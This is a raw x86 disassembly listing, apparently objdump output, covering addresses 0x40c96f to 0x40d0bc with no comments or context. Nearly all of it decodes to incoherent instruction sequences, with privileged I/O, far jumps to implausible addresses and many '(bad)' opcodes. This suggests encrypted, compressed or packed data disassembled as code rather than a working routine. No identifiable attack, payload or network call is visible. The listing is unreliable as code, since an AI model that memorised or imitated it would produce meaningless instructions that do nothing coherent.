  40c96f:	cmp    DWORD PTR [ebx+0x32],ebp
  40c972:	push   edi
  40c973:	cld    
  40c974:	aas    
  40c975:	inc    ebx
  40c976:	cli    
  40c977:	stos   DWORD PTR es:[edi],eax
  40c978:	sbb    al,0x83
  40c97a:	rcl    DWORD PTR [ebx],1
  40c97c:	aam    0x99
  40c97e:	pop    ebp
  40c97f:	and    al,bl
  40c981:	lock fstp QWORD PTR [esi]
  40c984:	scas   al,BYTE PTR es:[edi]
  40c985:	(bad)  
  40c986:	dec    edi
  40c987:	mov    edx,0x8a25b52c
  40c98c:	mov    ebx,0xeef2fa7e
  40c991:	xchg   BYTE PTR [esi+0x15191bf3],cl
  40c997:	sbb    al,0xb0
  40c999:	fadd   DWORD PTR [edx+0x21805987]
  40c99f:	or     ecx,DWORD PTR [ebx+esi*8]
  40c9a2:	jmp    0x40c9ff
  40c9a4:	fild   DWORD PTR [eax-0x1f29828d]
  40c9aa:	(bad)  
  40c9ab:	fadd   QWORD PTR [ebp+0x54e1a37b]
  40c9b1:	scas   eax,DWORD PTR es:[edi]
  40c9b2:	jmp    0xf78a6f24
  40c9b7:	aaa    
  40c9b8:	outs   dx,BYTE PTR ds:[esi]
  40c9b9:	cmp    eax,0xa536da99
  40c9be:	(bad)  
  40c9bf:	(bad)  
  40c9c0:	stos   BYTE PTR es:[edi],al
  40c9c1:	jns    0x40c98b
  40c9c3:	and    edx,esi
  40c9c5:	jae    0x40c9b4
  40c9c7:	clc    
  40c9c8:	popa   
  40c9c9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c9ca:	add    ecx,DWORD PTR [ecx-0x4a6922a6]
  40c9d0:	sub    edi,0xf8a9f83a
  40c9d6:	dec    eax
  40c9d7:	lods   eax,DWORD PTR ds:[esi]
  40c9d8:	jns    0x40c9dd
  40c9da:	syscall 
  40c9dc:	or     ch,BYTE PTR [ebp+0x1c]
  40c9df:	inc    ebx
  40c9e0:	adc    DWORD PTR [esi+0x79],0x23
  40c9e4:	adc    ecx,0x4c72f3d2
  40c9ea:	lock out 0x8e,eax
  40c9ed:	push   ds
  40c9ee:	lods   eax,DWORD PTR ds:[esi]
  40c9ef:	leave  
  40c9f0:	outs   dx,BYTE PTR ds:[esi]
  40c9f1:	jb     0x40c9c5
  40c9f3:	leave  
  40c9f4:	outs   dx,BYTE PTR ds:[esi]
  40c9f5:	pop    ss
  40c9f6:	sbb    eax,0xc088d40c
  40c9fb:	sti    
  40c9fc:	mov    edx,0x647ea729
  40ca01:	xor    eax,0xcf97ceb2
  40ca06:	dec    ecx
  40ca07:	mov    eax,ds:0xc2a5414
  40ca0c:	sub    edi,edi
  40ca0e:	popa   
  40ca0f:	add    ecx,DWORD PTR [ebx+0x8]
  40ca12:	xor    BYTE PTR [ebx+eax*8+0x9],ch
  40ca16:	push   cs
  40ca17:	sub    DWORD PTR [ebp-0x59],eax
  40ca1a:	aam    0x4d
  40ca1c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ca1d:	mov    dl,0x7f
  40ca1f:	aam    0xb6
  40ca21:	mov    dl,0xfd
  40ca23:	add    ch,BYTE PTR [ebx-0x6b]
  40ca26:	call   DWORD PTR [eax+0x75]
  40ca29:	pop    edx
  40ca2a:	dec    esp
  40ca2b:	push   eax
  40ca2c:	adc    BYTE PTR [eax],dh
  40ca2e:	mov    eax,0xf452da30
  40ca33:	dec    ebx
  40ca34:	pop    ebx
  40ca35:	dec    ebx
  40ca36:	dec    esp
  40ca37:	(bad)  
  40ca38:	div    DWORD PTR ds:0x6b60b2eb
  40ca3e:	dec    ebx
  40ca3f:	test   DWORD PTR [ecx+ebp*4],ebp
  40ca42:	mov    edx,0x2166f472
  40ca48:	xor    DWORD PTR [ecx-0x45dfdb12],ebp
  40ca4e:	add    eax,edi
  40ca50:	ins    BYTE PTR es:[edi],dx
  40ca51:	and    DWORD PTR [ebx+0x0],ebx
  40ca54:	xor    dl,BYTE PTR [edx+ebp*2-0x4a9db821]
  40ca5b:	mov    cl,0xf7
  40ca5d:	push   ss
  40ca5e:	call   0x1574e9e6
  40ca63:	fwait
  40ca64:	push   esi
  40ca65:	push   eax
  40ca66:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ca67:	call   FWORD PTR [ebx+0x391ae3b7]
  40ca6d:	(bad)  
  40ca6e:	stc    
  40ca6f:	pop    eax
  40ca70:	fwait
  40ca71:	push   esp
  40ca72:	loop   0x40cac6
  40ca74:	mov    ebp,0xaca73e6d
  40ca79:	int    0x93
  40ca7b:	popa   
  40ca7c:	daa    
  40ca7d:	adc    dh,BYTE PTR [ebp-0x3d0e1021]
  40ca83:	test   BYTE PTR [ebx],cl
  40ca85:	rcl    dh,0x4b
  40ca88:	sub    BYTE PTR [ebx+0x61],al
  40ca8b:	icebp  
  40ca8c:	bound  esp,QWORD PTR [eax+0x28]
  40ca8f:	ja     0x40caf1
  40ca91:	inc    eax
  40ca92:	test   BYTE PTR [ecx+0x5c],0x34
  40ca96:	or     eax,0x2a2e8927
  40ca9b:	inc    ecx
  40ca9c:	popf   
  40ca9d:	dec    esi
  40ca9e:	aad    0x5a
  40caa0:	arpl   WORD PTR [ebx],bp
  40caa2:	in     al,0x4
  40caa4:	pop    ebp
  40caa6:	push   0x4f
  40caa8:	sbb    DWORD PTR [ecx],0xb811e4a4
  40caae:	in     al,0xd8
  40cab0:	pushf  
  40cab1:	inc    edx
  40cab2:	jnp    0x40cb31
  40cab4:	sub    eax,DWORD PTR [esi]
  40cab6:	(bad)  
  40cab7:	xchg   ebp,eax
  40cab8:	xor    al,0xcb
  40caba:	push   0xba0aaa12
  40cabf:	push   cs
  40cac0:	scas   eax,DWORD PTR es:[edi]
  40cac1:	pop    ecx
  40cac2:	and    eax,0x9d131aaa
  40cac7:	and    eax,ebp
  40cac9:	push   0xa95929e9
  40cace:	imul   edi,DWORD PTR [ebp+ebp*2-0x54cde45b],0x5efdc4c5
  40cad9:	adc    DWORD PTR [esi*8-0x46f7bf8d],edi
  40cae0:	lods   al,BYTE PTR ds:[esi]
  40cae1:	xor    DWORD PTR [ecx+ebx*1-0x10d6c52a],0xd28c87a9
  40caec:	and    al,0x18
  40caee:	neg    al
  40caf0:	stc    
  40caf1:	in     al,0x5e
  40caf3:	jb     0x40cb05
  40caf5:	sbb    esp,edx
  40caf7:	cld    
  40caf8:	fistp  QWORD PTR [ebx]
  40cafa:	mov    ch,0xe8
  40cafc:	push   eax
  40cafd:	pop    esp
  40cafe:	sbb    edx,DWORD PTR [ecx+ebp*8+0x1b]
  40cb02:	cli    
  40cb03:	xor    eax,0x239b74dd
  40cb08:	xor    edx,DWORD PTR [eax]
  40cb0a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40cb0b:	pop    ds
  40cb0c:	fwait
  40cb0d:	xor    al,0xf9
  40cb0f:	aas    
  40cb10:	daa    
  40cb11:	push   ss
  40cb12:	dec    ebx
  40cb13:	repz push ss
  40cb15:	jae    0x40cb1e
  40cb17:	add    DWORD PTR [eax+0x6fb2d591],edi
  40cb1d:	push   ecx
  40cb1e:	(bad)  
  40cb1f:	in     al,dx
  40cb20:	and    eax,0xdf4df6cf
  40cb25:	sahf   
  40cb26:	inc    esp
  40cb27:	sar    ebp,1
  40cb29:	dec    esp
  40cb2a:	push   ss
  40cb2b:	ss fwait
  40cb2d:	mov    ecx,es
  40cb2f:	sti    
  40cb30:	sbb    DWORD PTR [edi+ebx*8],0x9cd1b2ac
  40cb37:	mov    edi,0x19822832
  40cb3c:	dec    esp
  40cb3d:	push   esp
  40cb3e:	add    eax,0x2d0c5941
  40cb43:	sub    dl,BYTE PTR [edi-0x5c]
  40cb46:	sub    DWORD PTR [ecx+0x56],0x7ce3f4bf
  40cb4d:	test   al,0x69
  40cb4f:	aaa    
  40cb50:	mov    dh,0x62
  40cb52:	call   0xa02c:0x79150091
  40cb59:	sub    DWORD PTR [edx],0xe8e0072d
  40cb5f:	ret    
  40cb60:	addr16 pop eax
  40cb62:	repz cdq 
  40cb64:	add    BYTE PTR [esi-0x4a4ebd78],dh
  40cb6a:	loop   0x40cbb6
  40cb6c:	sub    DWORD PTR [edi-0x4d7d54aa],esi
  40cb72:	(bad)  
  40cb74:	in     eax,0x5c
  40cb76:	std    
  40cb77:	shl    BYTE PTR [ebp-0x650a0da9],1
  40cb7d:	jns    0x40cb16
  40cb7f:	mov    al,ds:0x752ddb53
  40cb84:	and    ah,BYTE PTR [esp+edx*4]
  40cb87:	and    BYTE PTR [esi+0x29934380],0x69
  40cb8e:	pop    ss
  40cb8f:	xchg   esi,eax
  40cb90:	mov    edx,0xf97a2bd2
  40cb95:	adc    al,0x85
  40cb97:	gs pop esp
  40cb99:	push   ebp
  40cb9a:	loop   0x40cc12
  40cb9c:	add    BYTE PTR [ebp+0xd6d3cc6],bl
  40cba2:	mov    ds:0x4c4b2872,eax
  40cba7:	and    ebp,DWORD PTR [ebx]
  40cba9:	sub    ebp,DWORD PTR ds:0x5a785e07
  40cbaf:	sub    eax,0x14343718
  40cbb4:	(bad)  
  40cbb5:	shl    esi,1
  40cbb7:	enter  0x5856,0x11
  40cbbb:	std    
  40cbbc:	(bad)  
  40cbbd:	repnz (bad) [ebp+0x2c]
  40cbc1:	mov    ss,ecx
  40cbc3:	mov    ds:0x802a5de6,eax
  40cbc8:	jae    0x40cbea
  40cbca:	mov    bl,0x45
  40cbcc:	jl     0x40cc21
  40cbce:	(bad)  
  40cbcf:	fadd   QWORD PTR [ecx-0x4db868dd]
  40cbd5:	pushf  
  40cbd6:	mov    al,0x32
  40cbd8:	pop    edi
  40cbd9:	int3   
  40cbda:	mov    esi,0xd7c34816
  40cbdf:	stos   BYTE PTR es:[edi],al
  40cbe0:	inc    eax
  40cbe1:	mov    ebp,gs
  40cbe3:	(bad)  
  40cbe4:	and    eax,DWORD PTR [edi]
  40cbe6:	mov    ds:0xed8ee319,eax
  40cbeb:	cdq    
  40cbec:	in     al,0xfb
  40cbee:	push   esp
  40cbef:	mov    edx,0xbe34728
  40cbf4:	push   0x62
  40cbf6:	(bad)  
  40cbf7:	loope  0x40cc03
  40cbf9:	icebp  
  40cbfa:	pop    esi
  40cbfb:	add    DWORD PTR [ecx],esi
  40cbfd:	cmp    esi,edx
  40cbff:	mov    BYTE PTR [esi],ah
  40cc01:	xor    BYTE PTR [edi],0xfa
  40cc04:	mov    ebp,0x6ef77776
  40cc0a:	add    bh,bl
  40cc0c:	inc    edx
  40cc0d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40cc0e:	scas   eax,DWORD PTR es:[edi]
  40cc0f:	xchg   ebp,eax
  40cc10:	dec    eax
  40cc11:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40cc12:	out    dx,eax
  40cc13:	xchg   edx,eax
  40cc14:	and    DWORD PTR [ebx+0x4fb24a28],edx
  40cc1a:	jmp    0xe213:0x210ec9f2
  40cc21:	sub    eax,0x117875fb
  40cc26:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40cc27:	ret    0xfeec
  40cc2a:	pop    esi
  40cc2b:	jb     0x40cc34
  40cc2d:	stc    
  40cc2e:	fstp   QWORD PTR [edi]
  40cc30:	loope  0x40ccae
  40cc32:	jns    0x40cbd6
  40cc34:	outs   dx,BYTE PTR ds:[esi]
  40cc35:	adc    BYTE PTR [si+0x79],bl
  40cc39:	out    dx,al
  40cc3a:	in     eax,0x65
  40cc3c:	sub    edi,edi
  40cc3e:	push   ebx
  40cc3f:	sub    BYTE PTR [edi+0x28],cl
  40cc42:	ret    
  40cc43:	jae    0x40cc85
  40cc45:	mov    ds:0x49c85c33,al
  40cc4a:	xor    ecx,DWORD PTR [ebp+0x26]
  40cc4d:	mov    eax,ds:0x7f1a8b8a
  40cc52:	add    DWORD PTR [ebx-0x54],edi
  40cc55:	sbb    eax,0xf18a621a
  40cc5a:	outs   dx,DWORD PTR ds:[esi]
  40cc5b:	cld    
  40cc5c:	popa   
  40cc5d:	xor    BYTE PTR [esp+edx*4],bl
  40cc60:	xor    dl,BYTE PTR [edi-0x5d]
  40cc63:	jge    0x40cc11
  40cc65:	mov    eax,ds:0x690c6641
  40cc6a:	cmp    al,dl
  40cc6c:	enter  0x76c4,0x83
  40cc70:	sub    DWORD PTR [edx],edi
  40cc72:	repz sahf 
  40cc74:	xor    DWORD PTR [ebx-0x7e],edi
  40cc77:	int3   
  40cc78:	dec    ebp
  40cc79:	int    0xf8
  40cc7b:	pop    esp
  40cc7c:	sbb    al,0x97
  40cc7e:	cmp    bh,dh
  40cc80:	push   esp
  40cc81:	nop
  40cc82:	shr    BYTE PTR [edx+0x3d1036a],1
  40cc88:	stc    
  40cc89:	imul   edx,edi
  40cc8c:	add    edx,DWORD PTR [ebp-0x14]
  40cc8f:	mov    DWORD PTR [ebp-0x14],edx
  40cc92:	mov    edx,DWORD PTR [ebp-0xc]
  40cc95:	jmp    0x40d008
  40cc9a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40cc9b:	loopne 0x40cc38
  40cc9d:	mov    ebx,0xe364435b
  40cca2:	mov    ecx,DWORD PTR [esi]
  40cca4:	pop    eax
  40cca5:	push   es
  40cca6:	imul   ebp,DWORD PTR [esi+0x44],0xffffffdd
  40ccaa:	cmp    edx,DWORD PTR [edx+0x79ca7c7c]
  40ccb0:	jl     0x40cd2e
  40ccb2:	fdivr  DWORD PTR [ebp+0x1d]
  40ccb5:	push   edx
  40ccb6:	sbb    eax,DWORD PTR [edx]
  40ccb8:	ja     0x40cd16
  40ccba:	xchg   edx,eax
  40ccbb:	mov    ebx,eax
  40ccbd:	xor    eax,0x20
  40ccc0:	fild   WORD PTR [esi-0x6f]
  40ccc3:	ss xchg esp,eax
  40ccc5:	dec    ebx
  40ccc6:	mov    WORD PTR ds:0x60c1176a,gs
  40cccc:	daa    
  40cccd:	pop    es
  40ccce:	sbb    al,0xa2
  40ccd0:	loopne 0x40ccde
  40ccd2:	mov    ss,WORD PTR [ebx+ebx*4-0x5c]
  40ccd6:	not    DWORD PTR [esi+0x7a]
  40ccd9:	mov    dh,0x27
  40ccdb:	sbb    al,0xab
  40ccdd:	pop    ebx
  40ccde:	ds add eax,0x5c244c02
  40cce4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40cce5:	push   esp
  40cce6:	pop    es
  40cce7:	addr16 jge 0x40ccd9
  40ccea:	in     al,0x3f
  40ccec:	and    eax,edx
  40ccee:	loope  0x40cd5d
  40ccf0:	or     eax,0xb4a9ea79
  40ccf5:	adc    DWORD PTR [eax],esi
  40ccf7:	loopne 0x40cd4b
  40ccf9:	push   cs
  40ccfa:	pop    esp
  40ccfb:	cmp    DWORD PTR [eax+0x1f67323c],esi
  40cd01:	imul   ebx,DWORD PTR [ecx+0xda20479],0xffffff9a
  40cd08:	xchg   edi,eax
  40cd09:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40cd0a:	mov    ch,0xbc
  40cd0c:	xor    DWORD PTR [esi],edi
  40cd0e:	sbb    esi,DWORD PTR [eax-0x18]
  40cd11:	sahf   
  40cd12:	(bad)
  40cd16:	stos   BYTE PTR es:[edi],al
  40cd17:	pop    ss
  40cd18:	add    al,0xfb
  40cd1a:	es (bad) 
  40cd1c:	jbe    0x40cd0b
  40cd1e:	lahf   
  40cd1f:	sbb    DWORD PTR [esi+0x33e64529],0x1838507d
  40cd29:	mov    dl,0x2c
  40cd2b:	sub    esp,DWORD PTR [ecx+eiz*8-0x4195eea9]
  40cd32:	dec    edx
  40cd33:	cmc    
  40cd34:	jl     0x40cd8d
  40cd36:	push   es
  40cd37:	pop    esp
  40cd38:	push   ebp
  40cd39:	add    BYTE PTR [ebx],bl
  40cd3b:	push   0x351f91a4
  40cd40:	push   ds
  40cd41:	add    cl,al
  40cd43:	adc    BYTE PTR [ebx-0x72],ch
  40cd46:	push   edi
  40cd47:	lahf   
  40cd48:	sub    eax,0xa11ea6d5
  40cd4d:	sbb    ah,BYTE PTR [esi+0x53]
  40cd50:	sbb    al,0xef
  40cd52:	cmp    edx,DWORD PTR [edx+eiz*4]
  40cd55:	add    al,0x88
  40cd57:	imul   ecx,edi,0x3d
  40cd5a:	cld    
  40cd5b:	xor    ecx,edx
  40cd5d:	mov    al,ds:0xfc1b0ab
  40cd62:	test   eax,0xaa22c556
  40cd67:	out    0xb,al
  40cd69:	and    al,0x93
  40cd6b:	mov    bh,0x74
  40cd6d:	(bad)
  40cd71:	push   edi
  40cd72:	int    0x3a
  40cd74:	lea    ebp,[edi-0x6cbbd5b2]
  40cd7a:	ins    BYTE PTR es:[edi],dx
  40cd7b:	xor    BYTE PTR [edx],ch
  40cd7d:	mov    BYTE PTR [eax],dh
  40cd7f:	(bad)  
  40cd80:	gs out dx,eax
  40cd82:	and    ah,al
  40cd84:	outs   dx,DWORD PTR ds:[esi]
  40cd85:	jmp    0x4feb738c
  40cd8a:	fmul   DWORD PTR fs:[esi+0x42fad740]
  40cd91:	and    ecx,esp
  40cd93:	ret    0x9626
  40cd96:	mov    ds:0x18947805,al
  40cd9b:	hlt    
  40cd9c:	loope  0x40ce05
  40cd9e:	pusha  
  40cd9f:	ja     0x40cd22
  40cda1:	push   0x2f5b949b
  40cda6:	add    DWORD PTR fs:[eax-0x7],ecx
  40cdaa:	call   DWORD PTR [edi]
  40cdac:	into   
  40cdad:	cli    
  40cdae:	xchg   esi,eax
  40cdaf:	ins    DWORD PTR es:[edi],dx
  40cdb0:	xor    ebx,edx
  40cdb2:	and    eax,0x2ca977cd
  40cdb7:	inc    edx
  40cdb8:	mov    WORD PTR [ebx+0x2d8330aa],ds
  40cdbe:	mov    al,ds:0x236f6fea
  40cdc3:	pusha  
  40cdc4:	sahf   
  40cdc5:	int3   
  40cdc6:	sahf   
  40cdc7:	shl    BYTE PTR ds:0xaa338cbe,cl
  40cdcd:	aam    0x31
  40cdcf:	pop    esp
  40cdd0:	inc    ebx
  40cdd1:	jmp    0x5f7f1df8
  40cdd6:	add    al,BYTE PTR [esp+ebp*2-0x59]
  40cdda:	pop    edi
  40cddb:	pop    edx
  40cddc:	jb     0x40cdb5
  40cdde:	test   DWORD PTR [eax],edi
  40cde0:	cld    
  40cde1:	call   0xe787506e
  40cde6:	inc    ebx
  40cde7:	xchg   BYTE PTR [edx+0x16],al
  40cdea:	mov    bl,BYTE PTR [ebx+0x61]
  40cded:	push   edx
  40cdee:	jmp    0x40ce59
  40cdf0:	cmp    eax,0x92efbfc7
  40cdf5:	jl     0x40cd7c
  40cdf7:	in     al,0x72
  40cdf9:	shr    BYTE PTR [eax+0x12],0x4f
  40cdfd:	sbb    dh,BYTE PTR [edx]
  40cdff:	ins    DWORD PTR es:[edi],dx
  40ce00:	imul   edi,DWORD PTR [eax+0x35fab650],0xffffff83
  40ce07:	pop    eax
  40ce08:	adc    ecx,DWORD PTR [ebx+0x2cee6342]
  40ce0e:	push   edi
  40ce0f:	pop    es
  40ce10:	icebp  
  40ce11:	xor    esi,DWORD PTR [edi]
  40ce13:	les    esi,FWORD PTR [ebp-0x388f672f]
  40ce19:	inc    esi
  40ce1a:	mov    BYTE PTR [edx],bh
  40ce1c:	scas   eax,DWORD PTR es:[edi]
  40ce1d:	xor    cl,BYTE PTR [edx-0x20]
  40ce20:	sbb    eax,0x23270808
  40ce25:	test   eax,0xf16c6662
  40ce2a:	mov    ch,0xbc
  40ce2c:	jge    0x40ce9c
  40ce2e:	ins    DWORD PTR es:[edi],dx
  40ce2f:	pop    esp
  40ce30:	dec    edx
  40ce31:	add    al,ch
  40ce33:	push   ebp
  40ce34:	in     eax,dx
  40ce35:	popf   
  40ce36:	(bad)  
  40ce38:	iret   
  40ce39:	sub    al,0xe5
  40ce3b:	inc    esp
  40ce3c:	es aas 
  40ce3e:	fwait
  40ce3f:	pop    edi
  40ce40:	xchg   esi,eax
  40ce41:	mov    esi,0x66601056
  40ce46:	pop    edx
  40ce47:	(bad)  
  40ce49:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ce4a:	test   BYTE PTR [esi+0x78],0xa7
  40ce4e:	lods   eax,DWORD PTR ds:[esi]
  40ce4f:	xchg   ebx,eax
  40ce50:	mov    edx,0x9903a4ef
  40ce55:	and    al,0x3b
  40ce57:	mov    edi,0x3d9e7056
  40ce5c:	(bad)  
  40ce5e:	mov    BYTE PTR cs:[ecx+eiz*2+0x1332f961],cl
  40ce66:	xchg   edx,eax
  40ce67:	ds pop es
  40ce69:	cmp    al,0x46
  40ce6b:	xor    eax,DWORD PTR [edx+ebx*1+0x5c77a203]
  40ce72:	cmp    esp,DWORD PTR ds:0x6458f8ac
  40ce78:	push   ebp
  40ce79:	ror    DWORD PTR ds:0x447651ef,cl
  40ce7f:	call   0x81ed1733
  40ce84:	ss inc ecx
  40ce86:	xchg   ebp,eax
  40ce87:	dec    ebp
  40ce88:	nop
  40ce89:	inc    eax
  40ce8a:	fld    DWORD PTR cs:[esi+0x2a]
  40ce8e:	lock cld 
  40ce90:	(bad)  
  40ce91:	ss cmp ah,ah
  40ce94:	xchg   esp,eax
  40ce95:	jnp    0x40ce3b
  40ce97:	xchg   ebx,eax
  40ce98:	xchg   ebx,eax
  40ce99:	stos   DWORD PTR es:[edi],eax
  40ce9a:	fild   WORD PTR [esi-0x23]
  40ce9d:	or     esp,DWORD PTR [esp+edi*1-0xf]
  40cea1:	popa   
  40cea2:	sub    DWORD PTR [edx+esi*8],ebp
  40cea5:	jns    0x40cf01
  40cea7:	cmp    BYTE PTR [edi-0x62],ch
  40ceaa:	sub    edx,0x29f683bf
  40ceb0:	push   ecx
  40ceb1:	push   esp
  40ceb2:	mov    ds:0x946e84d0,eax
  40ceb7:	aaa    
  40ceb8:	rol    DWORD PTR [ecx+esi*4-0x2c],1
  40cebc:	mov    ds:0x455aebb3,eax
  40cec1:	(bad)  
  40cec2:	jp     0x40ce97
  40cec4:	adc    ecx,DWORD PTR [edx+0x3be4b2ad]
  40ceca:	sahf   
  40cecb:	imul   ebx,DWORD PTR ds:0x74f4a604,0xe195ab16
  40ced5:	sub    eax,0x2fe931e5
  40ceda:	sub    al,0x74
  40cedc:	mov    esi,0xb072820f
  40cee1:	xchg   edi,eax
  40cee2:	sbb    cl,BYTE PTR [edx]
  40cee4:	sub    BYTE PTR [edi+0x7cfe06fd],0x2a
  40ceeb:	enter  0xbb20,0xc9
  40ceef:	sub    al,0x3c
  40cef1:	xor    BYTE PTR [ecx+0x4f328bd0],cl
  40cef7:	mov    ebp,0x44c9c82a
  40cefc:	mov    bh,0x18
  40cefe:	test   eax,0xc41ce700
  40cf03:	iret   
  40cf04:	call   0xf8b1d2fe
  40cf09:	pop    esp
  40cf0a:	or     ch,al
  40cf0c:	fidivr WORD PTR [ebp-0x3]
  40cf0f:	(bad)  
  40cf10:	lock (bad) 
  40cf12:	retf   
  40cf13:	ficom  WORD PTR [ebx+0x5b]
  40cf17:	outs   dx,BYTE PTR ds:[esi]
  40cf18:	and    BYTE PTR [ecx],ah
  40cf1a:	jne    0x40cef9
  40cf1c:	fiadd  WORD PTR [ebp+0x259c2fd0]
  40cf22:	inc    esp
  40cf23:	dec    ebx
  40cf24:	shl    BYTE PTR [esi],0x4
  40cf27:	rol    DWORD PTR [edi+ecx*2-0x46],0x5f
  40cf2c:	xchg   esi,eax
  40cf2d:	sbb    BYTE PTR ss:[ebx+0x71],dl
  40cf31:	pop    ds
  40cf32:	jmp    FWORD PTR [esi+0x5fba24e5]
  40cf38:	jl     0x40cf60
  40cf3a:	call   0xef79fb5f
  40cf3f:	or     dh,BYTE PTR [ecx+ebp*1]
  40cf42:	enter  0x771f,0x27
  40cf46:	cmp    BYTE PTR [ebx+0x2d5dbf24],bl
  40cf4c:	push   ds
  40cf4d:	or     esi,DWORD PTR [ebx]
  40cf4f:	ins    DWORD PTR es:[edi],dx
  40cf50:	jne    0x40cf46
  40cf52:	adc    eax,0x5f76d5f6
  40cf57:	jmp    0x40cf32
  40cf59:	add    edi,DWORD PTR [eax]
  40cf5b:	mov    esp,0x3015cdfd
  40cf60:	stc    
  40cf61:	into   
  40cf62:	jbe    0x40cf96
  40cf64:	mov    eax,0x857f461b
  40cf69:	scas   al,BYTE PTR es:[edi]
  40cf6a:	jecxz  0x40ceec
  40cf6c:	mov    DWORD PTR gs:[ebx-0x4a11b99c],0xfb259094
  40cf77:	cdq    
  40cf78:	aas    
  40cf79:	xchg   edx,eax
  40cf7a:	mov    ds:0x25be368f,eax
  40cf7f:	mov    bl,0xfb
  40cf81:	xchg   ecx,eax
  40cf82:	xchg   BYTE PTR [esi],ch
  40cf84:	into   
  40cf85:	push   esi
  40cf86:	xchg   DWORD PTR [ebx],eax
  40cf88:	sub    al,0xf1
  40cf8a:	jne    0x40cf30
  40cf8c:	or     ebp,DWORD PTR ds:0x82e162d1
  40cf92:	test   ah,dh
  40cf94:	xchg   DWORD PTR [esi+esi*8+0x56fb6fcd],ebx
  40cf9b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40cf9c:	fiadd  WORD PTR [esi]
  40cf9e:	je     0x40cffa
  40cfa0:	popf   
  40cfa1:	adc    BYTE PTR [ebx],al
  40cfa3:	scas   al,BYTE PTR es:[edi]
  40cfa4:	inc    esp
  40cfa5:	out    dx,al
  40cfa6:	adc    DWORD PTR [esp+ecx*1],esi
  40cfa9:	or     eax,0xaeb51472
  40cfae:	loop   0x40cfc2
  40cfb0:	stc    
  40cfb1:	sub    esi,ebp
  40cfb3:	pop    ebx
  40cfb4:	mov    ss:0xd8d0d6a6,eax
  40cfba:	jmp    0x40d003
  40cfbc:	jge    0x40cf83
  40cfbe:	not    BYTE PTR [ebp+edx*2+0x67f90080]
  40cfc5:	test   al,0x29
  40cfc7:	xor    DWORD PTR [edi+0x20],0xffffffbc
  40cfcb:	imul   eax,DWORD PTR ds:0x9a1c149c,0x20
  40cfd2:	or     dl,BYTE PTR [esi+0x1b]
  40cfd5:	jno    0x40d045
  40cfd7:	ret    
  40cfd8:	stc    
  40cfd9:	xlat   BYTE PTR ds:[ebx]
  40cfda:	(bad)  
  40cfdb:	cwde   
  40cfdc:	sbb    bh,BYTE PTR [edx+0x2]
  40cfdf:	dec    ecx
  40cfe0:	push   edi
  40cfe1:	xor    BYTE PTR [ecx],ch
  40cfe3:	add    BYTE PTR [ecx],cl
  40cfe5:	popf   
  40cfe6:	ficom  WORD PTR [ebp*2-0x21a13217]
  40cfed:	inc    ch
  40cfef:	push   es
  40cff0:	sbb    BYTE PTR [eax+0x46],al
  40cff3:	sbb    eax,0x1491f4e3
  40cff8:	inc    edx
  40cff9:	inc    edx
  40cffa:	adc    dl,BYTE PTR [esi]
  40cffc:	dec    esp
  40cffd:	push   ebp
  40cffe:	cmp    bl,BYTE PTR [ecx+esi*1]
  40d001:	adc    eax,0xbf81db01
  40d006:	sub    DWORD PTR [ebx+ecx*4-0x2fcc2383],0x3
  40d00e:	ror    DWORD PTR [edi],1
  40d010:	scas   eax,DWORD PTR es:[edi]
  40d011:	xlat   BYTE PTR ds:[ebx]
  40d012:	jmp    0x40d385
  40d017:	retf   
  40d018:	jo     0x40cff3
  40d01a:	or     ah,BYTE PTR [ecx-0x63]
  40d01d:	jmp    0x40d09c
  40d01f:	sahf   
  40d020:	xor    dl,dh
  40d022:	ins    BYTE PTR es:[edi],dx
  40d023:	mov    esi,0x9190cd8e
  40d028:	lahf   
  40d029:	jl     0x40d0a7
  40d02b:	retf   0x7c79
  40d02e:	jl     0x40d04e
  40d030:	mov    esp,0xf3648500
  40d035:	add    al,0xfa
  40d037:	popa   
  40d038:	cmp    edi,esi
  40d03a:	push   cs
  40d03b:	enter  0xcc80,0xd7
  40d03f:	pop    edx
  40d040:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d041:	fcom   QWORD PTR [esp+esi*4]
  40d044:	xor    eax,0xd67988c7
  40d049:	je     0x40d00b
  40d04b:	daa    
  40d04c:	mov    bl,0xa
  40d04e:	popa   
  40d04f:	xor    DWORD PTR [edi],eax
  40d051:	pushf  
  40d052:	js     0x40cff2
  40d054:	fnstenv [eax+0x5f401db4]
  40d05a:	ficomp DWORD PTR [esi]
  40d05c:	fidiv  WORD PTR [edx]
  40d05e:	xchg   ebp,eax
  40d05f:	imul   ecx,DWORD PTR [eax+0x63],0x47
  40d063:	jecxz  0x40d0c5
  40d065:	dec    esi
  40d066:	(bad)  
  40d067:	mov    esi,0x2bb957d8
  40d06c:	out    dx,al
  40d06d:	jb     0x40d0df
  40d06f:	mov    WORD PTR [ebx-0x2f],gs
  40d072:	push   es
  40d073:	mov    ebp,0xc7269e9c
  40d078:	mov    ds:0x4dd88bd1,al
  40d07d:	cmp    al,0x85
  40d07f:	xchg   esi,eax
  40d080:	out    dx,al
  40d081:	gs mov ah,0xca
  40d084:	shl    DWORD PTR [esi+0x25],cl
  40d087:	cld    
  40d088:	inc    ecx
  40d089:	in     al,0x76
  40d08b:	cmp    eax,0x4ecd7109
  40d090:	adc    al,0x8a
  40d092:	mov    es,eax
  40d094:	sub    eax,0xc18d6f75
  40d099:	sbb    BYTE PTR [esi+ecx*2],bl
  40d09c:	jmp    0xdcf1c497
  40d0a1:	xor    ah,bl
  40d0a3:	mov    edi,0x43675898
  40d0a8:	sbb    esp,edi
  40d0aa:	dec    ecx
  40d0ab:	xchg   ebx,eax
  40d0ac:	push   ss
  40d0ad:	push   edi
  40d0ae:	retf   
  40d0af:	nop
  40d0b0:	aad    0xbc
  40d0b2:	adc    cl,dh
  40d0b4:	push   ds
  40d0b5:	mov    ebx,0x2a625c
  40d0ba:	inc    edx
  40d0bc:	into   
